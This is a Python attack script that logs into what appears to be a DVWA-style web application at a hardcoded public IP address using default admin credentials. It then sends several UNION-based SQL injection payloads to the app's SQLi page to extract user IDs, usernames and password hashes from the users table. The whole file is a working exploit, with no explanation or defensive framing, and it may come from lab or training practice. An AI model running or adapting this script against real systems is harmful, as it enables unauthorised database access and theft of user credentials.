
import requests
import re
import html

target_url = "http://31.97.117.123"
session = requests.Session()

# Login first
print("[*] Logging in...")
login_page = session.get(f"{target_url}/login.php")
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else None

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{target_url}/login.php", data=payload, allow_redirects=True)

# Now the key: we need to craft payload to extract the information displayed
# The display format is: ID: X<br />First name: Y<br />Surname: Z
# So we need to inject data that will fill those three fields

print("\n[*] Attempting UNION-based SQL injection...")

# The correct columns to select must match: ID, First Name, Surname
# Let's try to get all users
payloads = [
    "999 UNION SELECT CONCAT(user_id,' - ',user,' - ',password) as id, first_name, last_name FROM users WHERE 1",
    "999' UNION SELECT CONCAT(user_id,' | ',user,' | ',password), first_name, last_name FROM users-- -",
    "999' OR '1'='1' UNION SELECT CONCAT(user_id,' | ',user,' | ',password), first_name, last_name FROM users-- -",
]

all_results = []

for payload_str in payloads:
    print(f"\n[*] Trying: {payload_str[:75]}...")
    try:
        params = {"id": payload_str, "Submit": "Submit"}
        response = session.get(f"{target_url}/vulnerabilities/sqli/", params=params, timeout=10)
        
        # Extract the pre tag with results
        match = re.search(r'<pre[^>]*>(.*?)<\/pre>', response.text, re.DOTALL)
        if match:
            output = html.unescape(match.group(1).strip())
            print("[+] Raw output:")
            print(output)
            all_results.append(output)
                    
    except Exception as e:
        print(f"[-] Error: {str(e)}")

print("\n" + "="*80)
print("[*] All extracted results:")
print("="*80)
for i, result in enumerate(all_results):
    if result:
        print(f"\n[Result {i+1}]:\n{result}")

